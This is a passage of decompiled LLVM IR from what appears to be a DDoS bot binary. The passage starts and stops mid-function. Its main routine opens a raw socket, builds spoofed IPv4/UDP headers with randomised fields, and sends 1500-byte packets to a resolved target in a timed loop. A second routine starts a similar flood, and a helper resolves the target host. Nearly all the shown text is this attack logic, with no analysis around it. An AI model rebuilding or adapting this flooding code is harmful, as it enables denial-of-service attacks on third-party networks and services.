dec_label_pc_99ac:
  %stack_var_-4 = alloca i32, align 4
  store i32 39352, i32* %stack_var_-4, align 4
  %v2_99b4 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_99b4, i32* @fp, align 4
  %v7_99d0 = icmp eq i32 %arg3, 1
  br i1 %v7_99d0, label %dec_label_pc_9a24, label %dec_label_pc_99d8

dec_label_pc_99d8:                                ; preds = %dec_label_pc_99ac
  store i32 %arg2, i32* @r2, align 4
  %v3_99e4 = call i32 @function_8398(i32 %arg1, i32 ptrtoint ([26 x i8]* @global_var_18914.84 to i32))
  store i32 %arg2, i32* @r2, align 4
  %v3_9a1c = call i32 @function_8398(i32 %arg1, i32 ptrtoint ([35 x i8]* @global_var_18888.74 to i32))
  br label %dec_label_pc_9a9c

dec_label_pc_9a24:                                ; preds = %dec_label_pc_99ac
  %v2_9a28 = load i8, i8* bitcast (i8** @global_var_22ea4.8 to i8*), align 4
  %v2_9a2c = icmp eq i8 %v2_9a28, 0
  br i1 %v2_9a2c, label %dec_label_pc_9a34, label %dec_label_pc_9a48

dec_label_pc_9a34:                                ; preds = %dec_label_pc_9a24
  store i32 %arg2, i32* @r2, align 4
  %v3_9a40 = call i32 @function_8398(i32 %arg1, i32 ptrtoint ([29 x i8]* @global_var_18930.90 to i32))
  br label %dec_label_pc_9a9c

dec_label_pc_9a48:                                ; preds = %dec_label_pc_9a24
  %v1_9a4c = add i32 %arg4, 4
  %v1_9a50 = inttoptr i32 %v1_9a4c to i32*
  %v2_9a50 = load i32, i32* %v1_9a50, align 4
  %v3_9a5c = call i32 @function_f664(i8* bitcast (i32* @global_var_25500.80 to i8*), i32 %v2_9a50)
  %v2_9a64 = icmp eq i32 %v3_9a5c, 0
  br i1 %v2_9a64, label %dec_label_pc_9a80, label %dec_label_pc_9a6c

dec_label_pc_9a6c:                                ; preds = %dec_label_pc_9a48
  store i32 %arg2, i32* @r2, align 4
  %v3_9a78 = call i32 @function_8398(i32 %arg1, i32 ptrtoint ([27 x i8]* @global_var_18950.93 to i32))
  br label %dec_label_pc_9a9c

dec_label_pc_9a80:                                ; preds = %dec_label_pc_9a48
  store i8 0, i8* bitcast (i8** @global_var_22ea4.8 to i8*), align 4
  store i32 %arg2, i32* @r2, align 4
  %v3_9a98 = call i32 @function_8398(i32 %arg1, i32 ptrtoint ([30 x i8]* @global_var_1896c.95 to i32))
  br label %dec_label_pc_9a9c

dec_label_pc_9a9c:                                ; preds = %dec_label_pc_9a6c, %dec_label_pc_9a34, %dec_label_pc_99d8, %dec_label_pc_9a80
  %v1_9aa4 = phi i32 [ %v3_9a78, %dec_label_pc_9a6c ], [ %v3_9a40, %dec_label_pc_9a34 ], [ %v3_9a1c, %dec_label_pc_99d8 ], [ %v3_9a98, %dec_label_pc_9a80 ]
  ret i32 %v1_9aa4

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg2, { 3, 2, 4, 0, 1 }
  uselistorder i32 %arg1, { 3, 2, 4, 0, 1 }
  uselistorder label %dec_label_pc_9a9c, { 3, 0, 1, 2 }
}

define i32 @function_9acc(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_9acc:
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-292 = alloca i32, align 4
  %stack_var_-312 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_9acc = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_9acc, i32* @ip, align 4
  store i32 39640, i32* %stack_var_-4, align 4
  %v2_9ad4 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_9ad4, i32* @fp, align 4
  store i32 %arg4, i32* %stack_var_-312, align 4
  %v7_9af0 = icmp eq i32 %arg3, 1
  br i1 %v7_9af0, label %dec_label_pc_9b24, label %dec_label_pc_9af8

dec_label_pc_9af8:                                ; preds = %dec_label_pc_9acc
  store i32 %arg2, i32* @r2, align 4
  %v3_9b04 = call i32 @function_8398(i32 %arg1, i32 ptrtoint ([31 x i8]* @global_var_1898c.97 to i32))
  store i32 0, i32* bitcast (i8** @global_var_22ea8.18 to i32*), align 4
  store i32 0, i32* @global_var_22eac.20, align 4
  br label %dec_label_pc_9cf8

dec_label_pc_9b24:                                ; preds = %dec_label_pc_9acc
  %v1_9b28 = add i32 %arg4, 4
  %v1_9b2c = inttoptr i32 %v1_9b28 to i32*
  %v2_9b2c = load i32, i32* %v1_9b2c, align 4
  store i32 %v2_9b2c, i32* @r0, align 4
  %v0_9b34 = call i32 @function_f2e0()
  %tmp = icmp ult i32 %v0_9b34, 17
  br i1 %tmp, label %dec_label_pc_9b58, label %dec_label_pc_9b44

dec_label_pc_9b44:                                ; preds = %dec_label_pc_9b24
  store i32 %arg2, i32* @r2, align 4
  %v3_9b50 = call i32 @function_8398(i32 %arg1, i32 ptrtoint ([75 x i8]* @global_var_189ac.101 to i32))
  br label %dec_label_pc_9cf8

dec_label_pc_9b58:                                ; preds = %dec_label_pc_9b24
  %v3_9b58 = load i32, i32* %stack_var_-312, align 4
  %v1_9b5c = add i32 %v3_9b58, 4
  %v1_9b60 = inttoptr i32 %v1_9b5c to i32*
  %v2_9b60 = load i32, i32* %v1_9b60, align 4
  %v2_9b64 = ptrtoint i32* %stack_var_-292 to i32
  store i32 %v2_9b60, i32* @r1, align 4
  %v2_9b70 = bitcast i32* %stack_var_-292 to i8*
  %v3_9b70 = call i32 @function_f53c(i8* %v2_9b70, i32 %v2_9b60)
  store i32 %v2_9b64, i32* @r0, align 4
  %v0_9b7c = call i32 @function_f2e0()
  %v2_9b90 = ptrtoint i32* %stack_var_-24 to i32
  %v1_9b84 = add i32 %v2_9b90, -1
  %v2_9b94 = add i32 %v1_9b84, %v0_9b7c
  %v2_9b98 = add i32 %v2_9b94, -268
  %v1_9b9c = inttoptr i32 %v2_9b98 to i8*
  %v2_9b9c = load i8, i8* %v1_9b9c, align 1
  %v7_9ba0 = icmp eq i8 %v2_9b9c, 46
  br i1 %v7_9ba0, label %dec_label_pc_9ba8, label %dec_label_pc_9c28

dec_label_pc_9ba8:                                ; preds = %dec_label_pc_9b58
  store i32 %v2_9b64, i32* @r0, align 4
  %v0_9bb0 = call i32 @function_f2e0()
  %v1_9bb8 = add i32 %v2_9b90, -269
  %v2_9bcc = add i32 %v1_9bb8, %v0_9bb0
  %v3_9bd4 = inttoptr i32 %v2_9bcc to i8*
  store i8 0, i8* %v3_9bd4, align 1
  br label %dec_label_pc_9c28

dec_label_pc_9bec:                                ; preds = %dec_label_pc_9c28
  %v2_9bfc = add i32 %stack_var_-36.0, %v2_9b90
  %v2_9c00 = add i32 %v2_9bfc, -268
  %v1_9c04 = inttoptr i32 %v2_9c00 to i8*
  %v2_9c04 = load i8, i8* %v1_9c04, align 1
  %v7_9c08 = icmp eq i8 %v2_9c04, 46
  br i1 %v7_9c08, label %dec_label_pc_9c10, label %dec_label_pc_9c1c

dec_label_pc_9c10:                                ; preds = %dec_label_pc_9bec
  %v1_9c14 = add i32 %stack_var_-32.1, 1
  br label %dec_label_pc_9c1c

dec_label_pc_9c1c:                                ; preds = %dec_label_pc_9bec, %dec_label_pc_9c10
  %stack_var_-32.0 = phi i32 [ %v1_9c14, %dec_label_pc_9c10 ], [ %stack_var_-32.1, %dec_label_pc_9bec ]
  %v1_9c20 = add i32 %stack_var_-36.0, 1
  br label %dec_label_pc_9c28

dec_label_pc_9c28:                                ; preds = %dec_label_pc_9ba8, %dec_label_pc_9b58, %dec_label_pc_9c1c
  %stack_var_-32.1 = phi i32 [ %stack_var_-32.0, %dec_label_pc_9c1c ], [ 1, %dec_label_pc_9b58 ], [ 1, %dec_label_pc_9ba8 ]
  %stack_var_-36.0 = phi i32 [ %v1_9c20, %dec_label_pc_9c1c ], [ 0, %dec_label_pc_9b58 ], [ 0, %dec_label_pc_9ba8 ]
  store i32 %stack_var_-36.0, i32* @r4, align 4
  store i32 %v2_9b64, i32* @r0, align 4
  %v0_9c34 = call i32 @function_f2e0()
  %v0_9c3c = load i32, i32* @r4, align 4
  %v3_9c3c = icmp ult i32 %v0_9c3c, %v0_9c34
  br i1 %v3_9c3c, label %dec_label_pc_9bec, label %dec_label_pc_9c44

dec_label_pc_9c44:                                ; preds = %dec_label_pc_9c28
  %v1_9c48 = sub i32 4, %stack_var_-32.1
  %v3_9c9823 = icmp eq i32 %v1_9c48, 0
  %v5_9c9c28 = icmp sgt i32 %v1_9c48, 0
  br i1 %v5_9c9c28, label %dec_label_pc_9c5c, label %dec_label_pc_9ca0

dec_label_pc_9c5c:                                ; preds = %dec_label_pc_9c44, %dec_label_pc_9c5c
  %storemerge229 = phi i32 [ %v1_9c88, %dec_label_pc_9c5c ], [ 0, %dec_label_pc_9c44 ]
  store i32 %v2_9b64, i32* @r4, align 4
  store i32 %v2_9b64, i32* @r0, align 4
  %v0_9c68 = call i32 @function_f2e0()
  %v0_9c70 = load i32, i32* @r4, align 4
  %v2_9c70 = add i32 %v0_9c70, %v0_9c68
  store i32 %v2_9c70, i32* @r3, align 4
  store i32 %v2_9c70, i32* @r0, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_189f8.103 to i32), i32* @r1, align 4
  store i32 3, i32* @r2, align 4
  %v0_9c80 = call i32 @function_f350()
  %v1_9c88 = add nuw nsw i32 %storemerge229, 1
  %v5_9c9c = icmp slt i32 %v1_9c88, %v1_9c48
  br i1 %v5_9c9c, label %dec_label_pc_9c5c, label %dec_label_pc_9ca0

dec_label_pc_9ca0:                                ; preds = %dec_label_pc_9c5c, %dec_label_pc_9c44
  store i32 %v2_9b64, i32* @r0, align 4
  %v1_9ca8 = call i32 @function_f904(i32 %v2_9b64)
  br i1 %v3_9c9823, label %dec_label_pc_9cec, label %dec_label_pc_9cd0

dec_label_pc_9cd0:                                ; preds = %dec_label_pc_9ca0
  %v2_9cd8 = call i32 @function_8d14(i32 256, i32 %v1_9c48)
  br label %dec_label_pc_9cec

dec_label_pc_9cec:                                ; preds = %dec_label_pc_9ca0, %dec_label_pc_9cd0
  %storemerge = phi i32 [ %v2_9cd8, %dec_label_pc_9cd0 ], [ 1, %dec_label_pc_9ca0 ]
  %v1_9d007 = phi i32 [ %v2_9cd8, %dec_label_pc_9cd0 ], [ %v1_9ca8, %dec_label_pc_9ca0 ]
  store i32 %storemerge, i32* @global_var_22eac.20, align 4
  store i32 %v1_9ca8, i32* bitcast (i8** @global_var_22ea8.18 to i32*), align 4
  br label %dec_label_pc_9cf8

dec_label_pc_9cf8:                                ; preds = %dec_label_pc_9b44, %dec_label_pc_9af8, %dec_label_pc_9cec
  %v1_9d00 = phi i32 [ %v3_9b50, %dec_label_pc_9b44 ], [ %v3_9b04, %dec_label_pc_9af8 ], [ %v1_9d007, %dec_label_pc_9cec ]
  ret i32 %v1_9d00

; uselistorder directives
  uselistorder i32 %v1_9ca8, { 1, 0 }
  uselistorder i32 %v1_9c88, { 1, 0 }
  uselistorder i32 %v1_9c48, { 2, 3, 0, 1 }
  uselistorder i32 %stack_var_-36.0, { 2, 0, 1 }
  uselistorder i32 %stack_var_-32.1, { 0, 2, 1 }
  uselistorder i32 %v2_9b90, { 0, 2, 1 }
  uselistorder i32 %v2_9b64, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 (i32, i32)* @function_8d14, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_9cf8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_9cec, { 1, 0 }
  uselistorder label %dec_label_pc_9c5c, { 1, 0 }
  uselistorder label %dec_label_pc_9c28, { 2, 0, 1 }
  uselistorder label %dec_label_pc_9c1c, { 1, 0 }
}

define i32 @function_9d18(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_9d18:
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_9d1c = load i32, i32* @fp, align 4
  store i32 40228, i32* %stack_var_-4, align 4
  %v2_9d20 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_9d20, i32* @fp, align 4
  store i32 %arg2, i32* %stack_var_-32, align 4
  store i32 %arg2, i32* @r0, align 4
  %v1_9d34 = call i32 @function_fa50(i32 %arg2)
  store i32 %v1_9d34, i32* @global_var_232b4.105, align 4
  %v3_9d4c = icmp eq i32 %v1_9d34, -1
  br i1 %v3_9d4c, label %dec_label_pc_9d54, label %dec_label_pc_9db8

dec_label_pc_9d54:                                ; preds = %dec_label_pc_9d18
  %v3_9d54 = load i32, i32* %stack_var_-32, align 4
  store i32 %v3_9d54, i32* @r0, align 4
  %v1_9d58 = call i32 @function_fa78(i32 %v3_9d54)
  %v2_9d68 = icmp eq i32 %v1_9d58, 0
  br i1 %v2_9d68, label %dec_label_pc_9d70, label %dec_label_pc_9d94

dec_label_pc_9d70:                                ; preds = %dec_label_pc_9d54
  %v2_9d74 = load i32, i32* @global_var_25608.10, align 4
  store i32 %arg1, i32* @r2, align 4
  %v3_9d88 = call i32 @function_8398(i32 %v2_9d74, i32 ptrtoint ([33 x i8]* @global_var_189fc.108 to i32))
  %v1_9d90 = call i32 @function_1148c(i32 0)
  br label %dec_label_pc_9d94

dec_label_pc_9d94:                                ; preds = %dec_label_pc_9d54, %dec_label_pc_9d70
  %v1_9d98 = add i32 %v1_9d58, 16
  %v2_9d98 = inttoptr i32 %v1_9d98 to i32*
  %v3_9d98 = load i32, i32* %v2_9d98, align 4
  %v1_9d9c = inttoptr i32 %v3_9d98 to i32*
  %v2_9d9c = load i32, i32* %v1_9d9c, align 4
  %v1_9da4 = add i32 %v1_9d58, 12
  %v2_9da4 = inttoptr i32 %v1_9da4 to i32*
  %v3_9da4 = load i32, i32* %v2_9da4, align 4
  store i32 %v3_9da4, i32* @r3, align 4
  store i32 %v3_9da4, i32* @r2, align 4
  %v3_9db4 = call i32 @function_f340(i32 %v2_9d9c, i32 ptrtoint (i32* @global_var_232b4.105 to i32), i32 %v3_9da4)
  %v2_9dbc.pre = load i32, i32* @global_var_232b4.105, align 4
  br label %dec_label_pc_9db8

dec_label_pc_9db8:                                ; preds = %dec_label_pc_9d18, %dec_label_pc_9d94
  %v2_9dbc = phi i32 [ %v1_9d34, %dec_label_pc_9d18 ], [ %v2_9dbc.pre, %dec_label_pc_9d94 ]
  store i32 %v3_9d1c, i32* @fp, align 4
  ret i32 %v2_9dbc

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* @global_var_232b4.105, { 0, 2, 1 }
  uselistorder i32 %arg2, { 2, 1, 0 }
  uselistorder label %dec_label_pc_9db8, { 1, 0 }
  uselistorder label %dec_label_pc_9d94, { 1, 0 }
}

define i32 @function_9ddc(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_9ddc:
  %tmp11 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-1544 = alloca i32, align 4
  %stack_var_-1552 = alloca i32, align 4
  %stack_var_-1572 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  store i32 40424, i32* %stack_var_-4, align 4
  %v2_9de4 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_9de4, i32* @fp, align 4
  %v2_9e08 = call i32 @function_cbf4(i32* null)
  %v1_9e18 = call i32 @function_8400(i32 %arg2)
  %v2_9e20 = icmp eq i32 %v1_9e18, 0
  br i1 %v2_9e20, label %dec_label_pc_9e28, label %dec_label_pc_a170

dec_label_pc_9e28:                                ; preds = %dec_label_pc_9ddc
  %v3_9e34 = call i32 @function_fc94(i32 2, i32 3, i32 255)
  %v1_9e44 = icmp slt i32 %v3_9e34, 0
  br i1 %v1_9e44, label %dec_label_pc_9e4c, label %dec_label_pc_9e54

dec_label_pc_9e4c:                                ; preds = %dec_label_pc_9e28
  %v1_9e50 = call i32 @function_1148c(i32 1)
  br label %dec_label_pc_9e54

dec_label_pc_9e54:                                ; preds = %dec_label_pc_9e28, %dec_label_pc_9e4c
  %v8_9e5c = icmp sgt i32 %arg3, 2
  br i1 %v8_9e5c, label %dec_label_pc_9e78, label %dec_label_pc_9e60

dec_label_pc_9e60:                                ; preds = %dec_label_pc_9e54
  store i32 %arg2, i32* @r2, align 4
  %v3_9e6c = call i32 @function_8398(i32 %arg1, i32 ptrtoint ([39 x i8]* @global_var_18a20.110 to i32))
  %v1_9e74 = call i32 @function_1148c(i32 1)
  br label %dec_label_pc_9e78

dec_label_pc_9e78:                                ; preds = %dec_label_pc_9e54, %dec_label_pc_9e60
  %v1_9e7c = add i32 %arg4, 4
  %v1_9e80 = inttoptr i32 %v1_9e7c to i32*
  %v2_9e80 = load i32, i32* %v1_9e80, align 4
  %v2_9e8c = call i32 @function_9d18(i32 %arg2, i32 %v2_9e80)
  %v1_9e9c = add i32 %arg4, 8
  %v1_9ea0 = inttoptr i32 %v1_9e9c to i32*
  %v2_9ea0 = load i32, i32* %v1_9ea0, align 4
  store i32 %v2_9ea0, i32* @r0, align 4
  %v1_9ea8 = call i32 @function_11290(i32 %v2_9ea0)
  %v1_9eb8 = add i32 %arg4, 12
  %v1_9ebc = inttoptr i32 %v1_9eb8 to i32*
  %v2_9ebc = load i32, i32* %v1_9ebc, align 4
  store i32 %v2_9ebc, i32* @r0, align 4
  %v1_9ec4 = call i32 @function_11290(i32 %v2_9ebc)
  %v2_9ed8 = ptrtoint i32* %stack_var_-1572 to i32
  %tmp39 = bitcast i32* %stack_var_-1572 to i8*
  %tmp40 = bitcast i32* %stack_var_-1552 to i16*
  store i32 1472, i32* @r2, align 4
  %v2_9f14 = bitcast i32* %stack_var_-1544 to i8*
  %v3_9f14 = call i32 @function_f240(i8* %v2_9f14, i32 10)
  store i32 %arg2, i32* @r2, align 4
  %v3_9f30 = call i32 @function_8398(i32 %arg1, i32 ptrtoint ([26 x i8]* @global_var_18a48.112 to i32))
  store i8 69, i8* %tmp39, align 4
  %v3_9f84 = or i32 %v2_9ed8, 1
  %v4_9f84 = inttoptr i32 %v3_9f84 to i8*
  store i8 0, i8* %v4_9f84, align 1
  %v3_9f94 = or i32 %v2_9ed8, 2
  %v4_9f94 = inttoptr i32 %v3_9f94 to i16*
  store i16 1500, i16* %v4_9f94, align 2
  %v3_9fa0 = add i32 %v2_9ed8, 6
  %v4_9fa0 = inttoptr i32 %v3_9fa0 to i16*
  store i16 0, i16* %v4_9fa0, align 2
  %v3_9fac = add i32 %v2_9ed8, 9
  %v4_9fac = inttoptr i32 %v3_9fac to i8*
  store i8 17, i8* %v4_9fac, align 1
  %v3_9fb8 = add i32 %v2_9ed8, 8
  %v4_9fb8 = inttoptr i32 %v3_9fb8 to i8*
  store i8 64, i8* %v4_9fb8, align 4
  %v2_9fc4 = add i32 %v2_9ed8, 16
  %v3_9fc4 = inttoptr i32 %v2_9fc4 to i32*
  store i32 %v2_9e8c, i32* %v3_9fc4, align 4
  %v3_9fd0 = urem i32 %tmp11, 65536
  %v1_9fd8 = call i32 @function_f8a4(i32 %v3_9fd0)
  %sext = mul i32 %v1_9fd8, 65536
  %v1_9fdc = sdiv i32 %sext, 65536
  %v4_9fe4 = ptrtoint i32* %stack_var_-1552 to i32
  %v1_9fe8 = trunc i32 %v1_9fdc to i16
  %v3_9fe8 = add i32 %v4_9fe4, 4
  %v4_9fe8 = inttoptr i32 %v3_9fe8 to i16*
  store i16 %v1_9fe8, i16* %v4_9fe8, align 4
  store i32 2, i32* %stack_var_-72, align 4
  %v2_a018 = icmp eq i32 %v1_9ea8, 0
  %v3_a05c = or i32 %v4_9fe4, 2
  %v4_a05c = inttoptr i32 %v3_a05c to i16*
  %v2_a078 = bitcast i32* %stack_var_-1572 to i16*
  %v3_a088 = add i32 %v4_9fe4, 6
  %v4_a088 = inttoptr i32 %v3_a088 to i16*
  %v2_a098 = add i32 %v2_9ed8, 12
  %v3_a098 = inttoptr i32 %v2_a098 to i32*
  %v3_a0b0 = add i32 %v2_9ed8, 4
  %v4_a0b0 = inttoptr i32 %v3_a0b0 to i16*
  %v3_a0dc = add i32 %v2_9ed8, 10
  %v4_a0dc = inttoptr i32 %v3_a0dc to i16*
  %v2_a0ec = ptrtoint i32* %stack_var_-72 to i32
  %v2_a144 = add i32 %v1_9ec4, %v2_9e08
  %v3_a028 = urem i32 %v1_9ea8, 65536
  br label %dec_label_pc_9ffc

dec_label_pc_9ffc:                                ; preds = %dec_label_pc_a160, %dec_label_pc_9e78
  %stack_var_-52.0 = phi i32 [ 0, %dec_label_pc_9e78 ], [ %v1_a164, %dec_label_pc_a160 ]
  %v0_9ffc = call i32 @function_10c88()
  %v1_a010 = trunc i32 %v0_9ffc to i16
  store i16 %v1_a010, i16* %tmp40, align 4
  br i1 %v2_a018, label %dec_label_pc_a048, label %dec_label_pc_a020

dec_label_pc_a020:                                ; preds = %dec_label_pc_9ffc
  %v1_a030 = call i32 @function_f8a4(i32 %v3_a028)
  %sext3 = mul i32 %v1_a030, 65536
  %v1_a034 = sdiv i32 %sext3, 65536
  %extract.t = trunc i32 %v1_a034 to i16
  br label %dec_label_pc_a060

dec_label_pc_a048:                                ; preds = %dec_label_pc_9ffc
  %v0_a048 = call i32 @function_10c88()
  %extract.t47 = trunc i32 %v0_a048 to i16
  br label %dec_label_pc_a060

dec_label_pc_a060:                                ; preds = %dec_label_pc_a020, %dec_label_pc_a048
  %v1_a034.sink.off0 = phi i16 [ %extract.t, %dec_label_pc_a020 ], [ %extract.t47, %dec_label_pc_a048 ]
  store i16 %v1_a034.sink.off0, i16* %v4_a05c, align 2
  %v3_a078 = call i32 @function_8d94(i16* %v2_a078, i32 1500)
  %sext4 = mul i32 %v3_a078, 65536
  %v1_a07c = sdiv i32 %sext4, 65536
  %v1_a088 = trunc i32 %v1_a07c to i16
  store i16 %v1_a088, i16* %v4_a088, align 2
  %v0_a08c = call i32 @function_8570()
  store i32 %v0_a08c, i32* %v3_a098, align 4
  %v0_a09c = call i32 @function_10c88()
  %v1_a0b0 = trunc i32 %v0_a09c to i16
  store i16 %v1_a0b0, i16* %v4_a0b0, align 4
  %v3_a0cc = call i32 @function_8d94(i16* %v2_a078, i32 1500)
  %v1_a0dc = trunc i32 %v3_a0cc to i16
  store i16 %v1_a0dc, i16* %v4_a0dc, align 2
  %v6_a11c = call i32 @function_fc10(i32 %v3_9e34, i32 %v2_9ed8, i32 1500, i32 0, i32 %v2_a0ec, i32 16)
  %tmp = icmp ult i32 %stack_var_-52.0, 50
  br i1 %tmp, label %dec_label_pc_a160, label %dec_label_pc_a12c

dec_label_pc_a12c:                                ; preds = %dec_label_pc_a060
  %v2_a130 = call i32 @function_cbf4(i32* null)
  %v3_a148 = icmp ult i32 %v2_a130, %v2_a144
  br i1 %v3_a148, label %dec_label_pc_a158, label %dec_label_pc_a150

dec_label_pc_a150:                                ; preds = %dec_label_pc_a12c
  %v1_a154 = call i32 @function_1148c(i32 0)
  br label %dec_label_pc_a158

dec_label_pc_a158:                                ; preds = %dec_label_pc_a12c, %dec_label_pc_a150
  br label %dec_label_pc_a160

dec_label_pc_a160:                                ; preds = %dec_label_pc_a060, %dec_label_pc_a158
  %stack_var_-52.1 = phi i32 [ %stack_var_-52.0, %dec_label_pc_a060 ], [ 0, %dec_label_pc_a158 ]
  %v1_a164 = add i32 %stack_var_-52.1, 1
  br label %dec_label_pc_9ffc

dec_label_pc_a170:                                ; preds = %dec_label_pc_9ddc
  ret i32 %v1_9e18

; uselistorder directives
  uselistorder i32 %stack_var_-52.0, { 1, 0 }
  uselistorder i32 %v2_9ed8, { 9, 0, 1, 2, 3, 4, 5, 6, 7, 8 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-72, { 1, 0 }
  uselistorder i32 %arg2, { 1, 2, 0, 3 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_a160, { 1, 0 }
  uselistorder label %dec_label_pc_a158, { 1, 0 }
  uselistorder label %dec_label_pc_a060, { 1, 0 }
  uselistorder label %dec_label_pc_9e78, { 1, 0 }
  uselistorder label %dec_label_pc_9e54, { 1, 0 }
}

define i32 @function_a184(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_a184:
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-136 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-116 = alloca i8, align 1
  %stack_var_-264 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_a188 = load i32, i32* @fp, align 4
  store i32 %v3_a188, i32* %stack_var_-16, align 4
  store i32 41360, i32* %stack_var_-4, align 4
  %v13_a188 = ptrtoint i32* %stack_var_-16 to i32
  %v2_a18c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_a18c, i32* @fp, align 4
  store i32 ptrtoint (i32* @global_var_18a64.114 to i32), i32* @r3, align 4
  %v2_a1a8 = ptrtoint i32* %stack_var_-264 to i32
  store i32 80, i32* @ip, align 4
  store i32 %v2_a1a8, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_18a64.114 to i32), i32* @r1, align 4
  store i32 80, i32* @r2, align 4
  %v0_a1bc = call i32 @function_f350()
  %v2_a1d4 = call i32 @function_cbf4(i32* null)
  %v1_a1e4 = call i32 @function_8400(i32 %arg2)
  %v2_a1ec = icmp eq i32 %v1_a1e4, 0
  br i1 %v2_a1ec, label %dec_label_pc_a1f4, label %dec_label_pc_a73c

dec_label_pc_a1f4:                                ; preds = %dec_label_pc_a184
  %v8_a1fc = icmp sgt i32 %arg3, 2
  br i1 %v8_a1fc, label %dec_label_pc_a218, label %dec_label_pc_a200

dec_label_pc_a200:                                ; preds = %dec_label_pc_a1f4
  store i32 %arg2, i32* @r2, align 4
  %v3_a20c = call i32 @function_8398(i32 %arg1, i32 ptrtoint ([39 x i8]* @global_var_18ab4.116 to i32))
  %v1_a214 = call i32 @function_1148c(i32 1)
  br label %dec_label_pc_a218

dec_label_pc_a218:                                ; preds = %dec_label_pc_a1f4, %dec_label_pc_a200
  %v3_a224 = call i32 @function_fc94(i32 2, i32 3, i32 255)
  %v1_a234 = icmp slt i32 %v3_a224, 0
  br i1 %v1_a234, label %dec_label_pc_a23c, label %dec_label_pc_a298.preheader

dec_label_pc_a23c:                                ; preds = %dec_label_pc_a218
  %v1_a240 = call i32 @function_1148c(i32 1)
  br label %dec_label_pc_a298.preheader

dec_label_pc_a298.preheader:                      ; preds = %dec_label_pc_a218, %dec_label_pc_a23c
  %v2_a264 = add i32 %v13_a188, -248
  %v2_a27c = add i32 %v13_a188, -60
  br label %dec_label_pc_a250

dec_label_pc_a250:                                ; preds = %dec_label_pc_a298.preheader, %dec_label_pc_a250
  %storemerge1112 = phi i32 [ 0, %dec_label_pc_a298.preheader ], [ %v1_a290, %dec_label_pc_a250 ]
  %v3_a25c = mul nuw nsw i32 %storemerge1112, 4
  %v2_a268 = add i32 %v2_a264, %v3_a25c
  %v1_a26c = inttoptr i32 %v2_a268 to i32*
  %v2_a26c = load i32, i32* %v1_a26c, align 4
  %v2_a280 = add i32 %v2_a27c, %storemerge1112
  %v1_a288 = trunc i32 %v2_a26c to i8
  %v3_a288 = inttoptr i32 %v2_a280 to i8*
  store i8 %v1_a288, i8* %v3_a288, align 1
  %v1_a290 = add nuw nsw i32 %storemerge1112, 1
  %v7_a2a0 = icmp slt i32 %v1_a290, 20
  br i1 %v7_a2a0, label %dec_label_pc_a250, label %dec_label_pc_a2a4

dec_label_pc_a2a4:                                ; preds = %dec_label_pc_a250
  %v1_a2a8 = add i32 %arg4, 4
  %v1_a2ac = inttoptr i32 %v1_a2a8 to i32*
  %v2_a2ac = load i32, i32* %v1_a2ac, align 4
  %v2_a2b8 = call i32 @function_9d18(i32 %arg2, i32 %v2_a2ac)
  %v1_a2c8 = add i32 %arg4, 12
  %v1_a2cc = inttoptr i32 %v1_a2c8 to i32*
  %v2_a2cc = load i32, i32* %v1_a2cc, align 4
  store i32 %v2_a2cc, i32* @r0, align 4
  %v1_a2d4 = call i32 @function_11290(i32 %v2_a2cc)
  store i32 %arg2, i32* @r2, align 4
  %v3_a2f8 = call i32 @function_8398(i32 %arg1, i32 ptrtoint ([24 x i8]* @global_var_18adc.118 to i32))
  store i8 69, i8* %stack_var_-116, align 1
  %v1_a49c = add i32 %arg4, 8
  %v1_a4a0 = inttoptr i32 %v1_a49c to i32*
  %v2_a4a0 = load i32, i32* %v1_a4a0, align 4
  store i32 %v2_a4a0, i32* @r0, align 4
  %v1_a4a8 = call i32 @function_11290(i32 %v2_a4a0)
  %v3_a4b4 = urem i32 %v1_a4a8, 65536
  %v1_a4bc = call i32 @function_f8a4(i32 %v3_a4b4)
  %v2_a5b4 = ptrtoint i8* %stack_var_-116 to i32
  %v2_a5c0 = bitcast i8* %stack_var_-116 to i16*
  %v2_a660 = ptrtoint i32* %stack_var_-96 to i32
  %v2_a668 = ptrtoint i32* %stack_var_-156 to i32
  %v2_a680 = ptrtoint i32* %stack_var_-76 to i32
  %v2_a688 = ptrtoint i32* %stack_var_-136 to i32
  %v2_a6b0 = bitcast i32* %stack_var_-168 to i16*
  %v2_a6c4 = ptrtoint i32* %stack_var_-184 to i32
  %v2_a710 = add i32 %v1_a2d4, %v2_a1d4
  br label %dec_label_pc_a4c8

dec_label_pc_a4c8:                                ; preds = %dec_label_pc_a72c, %dec_label_pc_a2a4
